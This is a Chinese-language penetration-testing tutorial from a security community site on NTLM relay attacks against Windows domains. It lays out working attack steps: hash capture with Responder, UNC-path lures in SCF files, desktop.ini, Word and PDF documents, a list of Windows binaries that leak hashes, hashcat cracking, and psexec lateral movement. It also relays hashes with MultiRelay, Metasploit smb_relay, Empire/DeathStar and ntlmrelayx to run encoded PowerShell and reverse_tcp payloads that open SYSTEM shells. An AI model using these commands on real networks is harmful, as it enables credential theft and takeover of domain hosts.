

# 内网渗透之 NTLM 中继劫持 - 先知社区

内网渗透之 NTLM 中继劫持

- - -

## 协议介绍

NTLM 是"NTLAN Manager"的缩写，NTLM 是 Windows NT 早期版本的标准安全协议，Windows 2000 支持 NTLM 是为了保持向后兼容，NTLM 是 Windows 2000 内置三种基本安全协议之一，同时也是为用户提供认证、完整性和机密性的一种网络协议，NTLM 协议有 NTLM v1，NTLM v2，NTLM Session v2 三种版本，协议的交互简图如下：

[![](assets/1701222524-418ea635d764c8112fb9682f8749473e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128134729-9e02ab02-8db1-1.png)

## 认证过程

NTLM 总体上来说就是一种挑战/响应 (Challenge/Response) 形式的消息，其主要包括三个步骤：

Step 1：客户端向服务器发送一个包含明文登录用户名的请求  
[![](assets/1701222524-b0886e03ffb0af603ade2a4a18166909.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128134910-da6bb1f6-8db1-1.png)

Step 2：Type2 message(challenge):服务端查询用户名是否存在，如果存在则查询本地 SAM 数据库并从中提取用户的 hash 值，之后再服务端生成一个 16 位的随机数 (即 Challenge)，并使用用户的密码 hash 值对 challenge 进行加密，在本地存储一份，同时将其命名为 challenge1，之后将 challenge 明文发送回客户端  
[![](assets/1701222524-7710a20c97c5d2695b0d0bc34327cdb7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128135728-03053d0c-8db3-1.png)

Step 3：Type3 message(authentication):客户端接收到 Challenge 后，使用当前登录用户的密码 hash 对 Challenge 加密，并将其发送给服务器，随后服务器比较 Challenge 和存储的加密内容 challenge1，如果相同则验证成功

[![](assets/1701222524-fbb2beb968c52193baad95426c75c7a2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128135743-0bb30eb6-8db3-1.png)

## 中继介绍

微软的 NTLM SSP(NTLM Security Support Provider) 为 NTLM 认证的实现提供了基本功能，是 Windows SSPI(Security Support Provider Interface) 的一种具体实现，NTLM SSP 只是实现了 NTLM 认证并没有规定使用什么协议来进行传输，实际上 SMB、HTTP、LDAP、MSSQL 等协议都可以携带 NTLM 认证的三类消息，也就是说我们可以通过这些协议来进行攻击，不过需要注意的是用户密码的 Hash 被称为 LM hash 或 NT Hash(Windows Vista/Windowsserver 2008 以后 LM hash 被弃用)，即所谓的 NTLM hash，这类 Hash 可以用来进行 PTT 攻击，但并不能用来 Relay Attack~  
Relay Attack 严格意义上讲是用于网络认证的 Net-NTLM Hash 的 Relay，Net-NTLM Hash 是由 NTLM 认证过程中客户端本地用户密码的 Hash 对服务端返回的 challenge 加密后返回给服务器用于验证的 Response，所以严格来讲，应该是 Net-NTLM Hash Relay

## 中继原理

中继的基本流程如下图所示：  
[![](assets/1701222524-d4dca3713b85877af6a0c61ca6a59595.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128140321-d55d756c-8db3-1.png)

在上图中的客户端视角里，攻击者就是他要访问的服务端，它在与攻击者这台主机进行 NTLM 认证，而整个流程也只有攻击者这台主机与其进行交互，而在服务端的视角里攻击者是客户端，攻击者在向服务端证明自己的身份，通过中间人攻击的方法，攻击者可以伪造成客户端来完成身份验证，其实攻击者所做的事情只是把所有客户端的请求 Relay 到服务端并把所有服务端的请求 Relay 到客户端，而在服务端看来一直以来只有攻击者在跟他交互，所以自然而然就认为攻击者就是客户端，这样子攻击者就达到了伪造成真正客户端的目的

## 中继步骤

NTLM 中继攻击只需要两步：

-   获取受害者 Net-NTLM Hash
-   使用 Net-NTLM Hash 进行重放攻击

## 哈希获取

### 基本网络命令

整个流程大致如下：

-   用户发送不正确的 SMB 共享地址，例如：\\Al1ex
-   DNS 服务器响应\\Al1ex——NOT FOUND
-   客户端进行 LLMNR/NBT-NS 广播
-   攻击者告诉客户端它是 Al1ex，并接受被害者发送用于认证的 NTLM v2 哈希值，保存于本地
-   响应者将错误发送回客户端，如果用户不是精于此道的话，通常不会引起警觉

具体实现步骤如下：  
Step 1：在攻击者主机中使用 responder([https://github.com/lgandx/Responder)执行如下命令开启监听：](https://github.com/lgandx/Responder)%E6%89%A7%E8%A1%8C%E5%A6%82%E4%B8%8B%E5%91%BD%E4%BB%A4%E5%BC%80%E5%90%AF%E7%9B%91%E5%90%AC%EF%BC%9A)

```bash
responder -I eth0 -f 

#参数说明：
 -I 指定使用的网卡
 -f 允许攻击者查看受害者的主机指纹
```

[![](assets/1701222524-9bef3a062f9cd6e3265ee3d1d2b39b86.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128140919-aa9b1e00-8db4-1.png)  
PS："ON"代表针对服务数据包的监听开启，"OFF"代表关闭监听  
Step 2：模拟用户错误输入一个不能解析的名称 (Al1ex）  
[![](assets/1701222524-52b24f30a0025f410a52200055fe1c3a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128140934-b38037e4-8db4-1.png)  
之后在我们的攻击主机中可以看到被记录的 Net-NTLM Hash 值：  
[![](assets/1701222524-6f01fe878bf2c50128aab577452ca10f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128140947-bb6831d2-8db4-1.png)  
我们使用以下命令也可以在 responder 中获取到 Net-NTLM Hash 值：

```bash
> net.exe use \hostshare 
> attrib.exe \hostshare  
> bcdboot.exe \hostshare  
> bdeunlock.exe \hostshare  
> cacls.exe \hostshare  
> certreq.exe \hostshare #(noisy, pops an error dialog) 
> certutil.exe \hostshare  
> cipher.exe \hostshare  
> ClipUp.exe -l \hostshare  
> cmdl32.exe \hostshare  
> cmstp.exe /s \hostshare  
> colorcpl.exe \hostshare #(noisy, pops an error dialog)  
> comp.exe /N=0 \hostshare \hostshare  
> compact.exe \hostshare  
> control.exe \hostshare  
> convertvhd.exe -source \hostshare -destination \hostshare  
> Defrag.exe \hostshare  
> diskperf.exe \hostshare  
> dispdiag.exe -out \hostshare  
> doskey.exe /MACROFILE=\hostshare  
> esentutl.exe /k \hostshare  
> expand.exe \hostshare  
> extrac32.exe \hostshare  
> FileHistory.exe \hostshare #(noisy, pops a gui)  
> findstr.exe * \hostshare  
> fontview.exe \hostshare #(noisy, pops an error dialog)  
> fvenotify.exe \hostshare #(noisy, pops an access denied error)  
> FXSCOVER.exe \hostshare #(noisy, pops GUI)  
> hwrcomp.exe -check \hostshare  
> hwrreg.exe \hostshare  
> icacls.exe \hostshare   
> licensingdiag.exe -cab \hostshare  
> lodctr.exe \hostshare  
> lpksetup.exe /p \hostshare /s  
> makecab.exe \hostshare  
> msiexec.exe /update \hostshare /quiet  
> msinfo32.exe \hostshare #(noisy, pops a "cannot open" dialog)  
> mspaint.exe \hostshare #(noisy, invalid path to png error)  
> msra.exe /openfile \hostshare #(noisy, error)  
> mstsc.exe \hostshare #(noisy, error)  
> netcfg.exe -l \hostshare -c p -i foo
```

### 通过系统图标

每个文件夹底下都有个文件 desktop.ini 来指定文件夹图标之类的，默认不可见，可以通过在控制面板中去掉"隐藏受保护的操作系统文件"看到  
[![](assets/1701222524-02348ac5088674f1f9dae54b17a45e16.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128141026-d2f3c938-8db4-1.png)  
每个文件夹底下都会有，我们新建一个新的文件夹的话，如果没看到 desktop.ini，可以尝试更改图标，就可以看到了  
[![](assets/1701222524-9de75ac03e1e29d80147703f8db8dd8d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128141041-dbc69fb8-8db4-1.png)  
之后将图标路径改成 UNC 路径，指向我们的服务器  
[![](assets/1701222524-3fd1185521e50a6e0fd687bb1e41e812.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128141054-e3bafd5e-8db4-1.png)  
当用户访问该文件夹的时候会去访问 UNC 路径，我们就能获取用户的 net-ntlm hash：  
[![](assets/1701222524-b6e05083da884753d1e4af0e4d412f18.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128141106-eac8d346-8db4-1.png)

### SCF 文件利用

scf 文件包含了 IconFile 属性，所以 Explore.exe 会尝试获取文件的图标，而 IconFile 是支持 UNC 路径的，以下是 scf 后缀的文件的格式

```bash
[Shell]
Command=2
IconFile=\\192.168.188.129\scf\test.ico
[Taskbar]
Command=ToggleDesktop
```

新建 test.scf，之后写入以上内容并将其放在一个文件夹底下，当用户访问该文件夹的时候，我们就会获得用户的 net-ntlm hash~  
[![](assets/1701222524-2116e18cd5aa2a3af2af1bb8f7a725a4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128141152-062cb3be-8db5-1.png)

### 用户头像利用

此方法适用于 Windows 10/2016/2019，在更改账户图片处用普通用户的权限指定一个webadv地址的图片，如果普通用户验证图片通过，那么SYSTEM用户(域内是机器用户)也去访问192.168.188.129，并且携带凭据，我们就可以拿到机器用户的net-ntlm hash，这个也可以用来提权  
[![](assets/1701222524-56e92925a8b65cbb63c12005f67e4742.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128141232-1dad7974-8db5-1.png)  
随后可以获得 NTLM-Hash 值：  
[![](assets/1701222524-9735de90591826f260297ac335fc70c6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128141247-271a3632-8db5-1.png)

### 通过构造 PDF 获取

PDF 规范允许为 GoTobe 和 GoToR 条目加载远程内容，PDF 文件可以添加一项功能，请求远程 SMB 服务器的文件，我们直接使用三好学生的脚本[https://github.com/3gstudent/Worse-PDF](https://github.com/3gstudent/Worse-PDF)  
[![](assets/1701222524-b4134e1a409521afdf5cc32c53ac0c8d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128141316-384b667e-8db5-1.png)  
当受害者使用 PDF 阅读器打开恶意的 PDF 时可导致载荷成功执行，并返回 NTLM-Hash  
[![](assets/1701222524-961079a62f474211919668336be98f9d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128141345-4931cca8-8db5-1.png)  
PS：经过笔者测试发现如果是使用 Chrome 或者 IE 浏览器打开 PDF 文件，并不会执行~

### Office 应用程序

首先新建一个 word，贴进一张图片  
[![](assets/1701222524-0ea5d1b81b1dfaa2f85c3a5877a20276.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128143058-b14cf392-8db7-1.png)  
然后用 7zip 打开 (没测试其他软件，可自行测试)，之后进入 word\_rels，修改 document.xml.rels  
[![](assets/1701222524-7c2cb8de431729ef99ad54367bce2158.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128143110-b888d072-8db7-1.png)  
可以看到 Target 参数本来是本地的路径  
[![](assets/1701222524-4262c3c60fadb44b2316301e879f464f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128143123-bfd222ac-8db7-1.png)  
修改为 UNC 路径，然后加上 TargetMode="External"  
[![](assets/1701222524-be6a7bffbf9b1e6999885d06b682df18.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128143231-e89bd0fc-8db7-1.png)  
当打开 word 的时候，我们就拿到 Net-NTLM Hash  
[![](assets/1701222524-75845a373cd05911b44aaea373e2c57a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128143245-f11a212a-8db7-1.png)

### Net-NTLM Crack

我们可以使用 hashcat 来破解 Net-NTLM 的哈希值，格式如下：

```bash
hashcat -m 5600 Net-NTLM-Hash  PasswordFileLocation
```

[![](assets/1701222524-c13e922dedc98d5fc83fc604dc198478.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128143318-0460d0e4-8db8-1.png)  
破解后的结果：  
[![](assets/1701222524-3e2b7fedc09b758d196e6d3568f3636d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128143329-0b3f442c-8db8-1.png)  
通过破解的账户与密码我们即可进行横向移动连接远程主机了：

```bash
./psexec.py hacker/administrator:'admin'@192.168.188.3
```

[![](assets/1701222524-775a440f99cc15c90f565d8e86b28daa.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128143353-194213e2-8db8-1.png)

## Net-NTLM Relay

### SMB 中继

#### 中继原理

客户端在连接服务端时默认先使用本机的用户名和密码 Hash 尝试登录，所以可以模拟 SMB 服务器从而截获其它 PC 的 Net-NTLM Hash，而作为中继的机器必须要有域管理员权限或本地管理员权限，且被中继的机器要关闭 SMB 签名认证，否则无法去做中继。

#### 利用条件

目标 SMB 签名需要关闭，在 SMB 连接中需要使用安全机制来保护服务器和客户端之间传输数据的完整性，而这种安全机制就是 SMB 签名和加密，如果关闭 SMB 签名，会允许攻击者拦截认证过程并且将获得 hash 在其他机器上进行重放，从而获得域管权限，目前 SMB 常用来做为 SMB 文件共享、打印机，如果签名关闭可能导致文件共享、打印机被入侵，我们可以使用 nmap 来确定是否关闭：

```bash
nmap -n -p445 192.168.188.3 --script=smb-security-mode
```

[![](assets/1701222524-9c746d93c817b854f898ac6308b998f3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128143508-45d897fa-8db8-1.png)

#### 利用方法

##### Responder

Step 1：进入到/usr/share/responder 目录下，编辑 Responder.conf 文件，设置 smb 和 http 为 Off，在攻击时直接利用该 hash 攻击其他机器即可不需要抓取  
[![](assets/1701222524-d5fe6b95ee5f5f729f9e45d5087d1be8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128143550-5f0587ce-8db8-1.png)  
Step 2：在 kali(192.168.188.129) 上使用 Responder 开启监听 (这里 responder 的作用就是当访问一个不存在的共享路径，将名称解析降到 LLMNR/NBNS 时来抓取网络中所有的 LLMNR 和 NetBIOS 请求并进行响应)

```bash
responder -I eth0 -w -r -f
```

[![](assets/1701222524-377e2e2761dcd7a4dfc6ce780ab83799.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128143717-92be465a-8db8-1.png)  
Step 3：使用 Responder 的 MultiRelay 模块，指向域内的一台普通主机

```bash
python MultiRelay.py -t 192.168.188.3 -u ALL
```

[![](assets/1701222524-5fdfac8b379523517d6366f415cb142a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128143742-a1a0285a-8db8-1.png)  
Step 5：在域控 server 2012 上建立文件共享请求，kali 即可接收到 192.168.188.3 的 sytem shell(实战中可以通过钓鱼发起请求)  
[![](assets/1701222524-a61d6a57fafe3da2832d4d41e86f1bd9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128143753-a846fa1c-8db8-1.png)  
Step 6：之后成功接收到目标主机的 Shell(注意在执行命令时需要用双引号包裹，在这里坑了好久，气死了都)  
[![](assets/1701222524-2413ead348d1d589a48d5c20cc8dd4e5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128143825-bb6774d2-8db8-1.png)

##### Metasploit

这里使用 MSF 框架中的 smb\_relay 模块来实施 SMB 中继攻击  
Step 1：设置载荷  
[![](assets/1701222524-f0b5e3cbacab48a51d953996bb40d393.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128144305-627329d8-8db9-1.png)  
Step 2：执行载荷  
[![](assets/1701222524-63db44f89642d6d00e20cbdaee3b6318.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128144316-68fb9c2c-8db9-1.png)  
Step 3：在 window 7 中上执行以下命令来访问恶意 SMB 服务

```bash
net use \\192.168.188.129\c$
```

Step 4：由于 Metasploit 的 SMBRelay 只支持 NTLM v1，所以在攻击一些机器时会出现"Failed to authenticate"的情况，但是这种思路是正确的，所以综合来看这种攻击方法在实战中也不是那么被看好  
[![](assets/1701222524-1076e75ae08efec47591aa39378ee50a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128144339-766a01dc-8db9-1.png)  
下面是一个 Windows Server 2003 中成功的示例：

```bash
msf exploit(windows/smb/smb_relay) > 
[*] Received 192.168.188.128:1032 X-90E984B4C76D4\Administrator LMHASH:77c5c86213cb376f72448eba4af2c32102bb5a6f121f4cc5 NTHASH:77c5c86213cb376f72448eba4af2c32102bb5a6f121f4cc5 OS:Windows Server 2003 R2 3790 Service Pack 2 LM:
[*] Authenticating to 192.168.188.128 as X-90E984B4C76D4\Administrator...
[*] AUTHENTICATED as X-90E984B4C76D4\Administrator...
[*] Connecting to the defined share...
[*] Regenerating the payload...
[*] Uploading payload...
[*] Created \hGaRjHmf.exe...
[*] Connecting to the Service Control Manager...
[*] Obtaining a service manager handle...
[*] Creating a new service...
[*] Closing service handle...
[*] Opening service...
[*] Starting the service...
[*] Removing the service...
[*] Sending stage (179779 bytes) to 192.168.188.128
[*] Closing service handle...
[*] Deleting \hGaRjHmf.exe...
```

然后直接 getshell，还是 system 权限，因为调用了系统服务：

```bash
msf exploit(windows/smb/smb_relay) > sessions 
Active sessions
===============
  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ X-90E984B4C76D4  192.168.188.136:4444 -> 192.168.138.188:1034 (192.168.188.128)
```

##### Empire

我们也可以使用 Empire 来进行 SMB 中继攻击测试，具体步骤如下所示：  
Step 1：启动 Empire 并清除 agent

```bash
./empire --rest --username username --password 123456
```

[![](assets/1701222524-ba60e14f5a953a1fdb21b17fe5c0e6b1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128144524-b55fac34-8db9-1.png)  
Step 2：启动 Deathstar，ip 为攻击机 ip，为了接管 agent

```bash
python3 DeathStar.py -lip 192.168.188.129 -t 100 -u username -p 123456
```

[![](assets/1701222524-16c2ce85d321c1ba4db7f18dfbfab9b8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128144550-c4f0540a-8db9-1.png)  
Step 3：在 empire 中生成 powershell，此时你会发现多了一个名为 DeathStar 的 listener，之后我们使用该 listener 来生成 powershell 代码：

[![](assets/1701222524-fd6d597d9ea9b0ee292410452c857d63.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128144610-d0907894-8db9-1.png)  
Step 4：启动 responder

```bash
Responder -I eht0 -r -d –v
```

[![](assets/1701222524-21c356834d4dc1d8955d2d301efb6233.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128144628-db440e0e-8db9-1.png)  
Step 5：之后使用 impacket 中的 ntlmrelayx 执行以下命令，条命令是对中继成功的机器自动执行 powershell 并获取 agent，powershell 脚本放在引号中

```bash
ntlmrelayx.py -t 192.168.188.3 -c 'powershell -noP -sta -w 1 -enc [powershell code]'
```

[![](assets/1701222524-4d65bec0a769caffc961323c5496afcf.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128144700-ee6c8a24-8db9-1.png)  
Step 6：在域控上创建共享操作

```bash
net use \\al1ex
```

[![](assets/1701222524-55d624e0a99da004429ed1fc66bef054.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128144716-f80f1c0e-8db9-1.png)  
Step 7：之后可以看到对每台 PC 进行了转发测试，若成功则反弹 shell，总体来说效果不是很好，耗时太长了，我也不想等了。。。

[![](assets/1701222524-a9c05ca7777ae629ddd3ea074bfabd4f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128144731-012722e6-8dba-1.png)

##### 自动化利用

在实战中我们可以使用 Responder + impacket + MSF 来实现获取 Net-NTLM hash，并通过 ntlm 中继获得域内普通用户的 msf shell，具体步骤如下：  
Step 1：开启 Responder 监听

```bash
responder -I eth0 -r -d -w
```

[![](assets/1701222524-9ddf2ec01c3c56bed91183eda9193a37.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128144811-18e6d4f8-8dba-1.png)  
Step 2：启动 MSF 的 exploit/multi/script/web\_delivery 模块

```bash
use exploit/multi/script/web_delivery
set target 2
set payload windows/x64/meterpreter/reverse_tcp
run
```

[![](assets/1701222524-e479f9ed95d1f026099de749deb3c196.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128144838-291949be-8dba-1.png)  
Step 3：启动 impacket 的 ntlmrelayx 模块

```bash
./ntlmrelayx.py -t ip -c "xxxxxxxxx" -smb2support

#参数说明：
-t : 单一主机
-tf: 主机文件列表，例如:ip.txt
-c : powershell 命令
```

[![](assets/1701222524-63fc6eda1b83be0d2f1e8cd405353176.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128144906-39678f24-8dba-1.png)  
Step 4：当域控发起请求时，通过 NTLM 中继，我们可以成功获取到目标主机的 Meterpreter 会话，如果我们将之前的参数"-t"改为"-tf"，即可获取 ip.txt 文件中的所有域内主机的 Meterpreter 会话  
[![](assets/1701222524-351dbfc28515fd25bb0c14ece3e6f728.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128144924-44251b84-8dba-1.png)

### NTLM 中继

#### impacket

我们可以借助 impacket 的 ntlmrelayx.py 模块来实现 NTLM 中继攻击，具体步骤如下：  
Step 1：在攻击机上执行如下命令监听 80 和 445 端口，伪造 http 和 smb 服务

```bash
python3 ./ntlmrelayx.py -t smb://192.168.188.4 -c whoami -smb2support
```

[![](assets/1701222524-4a89a8f797f861fbf649474a823344c4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128145123-8b20f36e-8dba-1.png)  
Step 2：诱导普通域用户或者域管理员用户访问攻击机上搭建的 HTTP 或 SMB 服务  
[![](assets/1701222524-ed7cc34e3f9bc94c09c942c6ef63c5a9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128145134-91c9e072-8dba-1.png)  
Step 3：在攻击主机上可以 Relay 域用户的 Net-NTLM Hash，从而在域内其他主机上执行指定的命令  
[![](assets/1701222524-050d02f9ebdcebc0226b926dc68e397e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231128145148-9a34effe-8dba-1.png)

## 文末小结

Net-NTLM Hash 攻击是一个拿域内主机的方法，在横向移动中利用还是挺不错的，可以直接控制域内主机，包括但不限于在远程服务器上执行命令、上传 exe 到远程主机上执行、dump 服务器的用户 hash 等
